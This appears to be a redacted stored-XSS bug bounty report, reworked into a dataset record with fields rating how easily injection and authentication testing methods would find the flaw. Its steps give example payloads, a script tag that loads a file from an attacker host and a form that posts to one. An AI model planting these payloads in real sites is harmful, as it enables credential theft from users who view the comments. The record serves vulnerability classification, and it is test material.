title: Stored XSS via Comment Form at ████████
content: Summary: An attacker can submit a comment form with injected HTML, leading to a number of malicious effects Step-by-step Reproduction Instructions Browse to https://████ Complete the form. I placed ">
steps: Browse to the target website and locate the comment form.
Inject malicious HTML/JavaScript payloads into the Name and Comments fields (e.g., `<script src=http://attackerip/blind.js/>` or `<form action=http://attackerIP>`).
Submit the form and observe the execution of the payload when the comment is viewed by an employee or another user.
vuln_description: A stored Cross-Site Scripting (XSS) vulnerability exists in the comment form of the target website, allowing attackers to inject malicious scripts that execute in the context of other users' browsers when the comments are viewed. This can lead to credential theft, forced browsing, or other malicious actions.
reason: The vulnerability is straightforward to discover as it involves injecting common XSS payloads into input fields without any complex interactions or state manipulations. The attack does not require understanding of novel logic or subtle interactions between components.

injection_metadata.reasoning: The vulnerability involves stored XSS through form fields using basic HTML/script payloads without filter bypasses. The methodology would detect this since: (1) The comment form parameters would be identified as injectable during request logging, (2) The payloads used match 'simple payload' criteria (common XSS vectors without encoding/custom bypasses), (3) Execution verification aligns with 'same channel' detection as viewing the stored comment through regular navigation would trigger the payload within the application context.

authnz_metadata.reason: The vulnerability involves stored XSS via a comment form, which is a client-side injection issue rather than an authentication or authorization bypass. The proposed methodologies focus on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, which does not apply to XSS vulnerabilities.
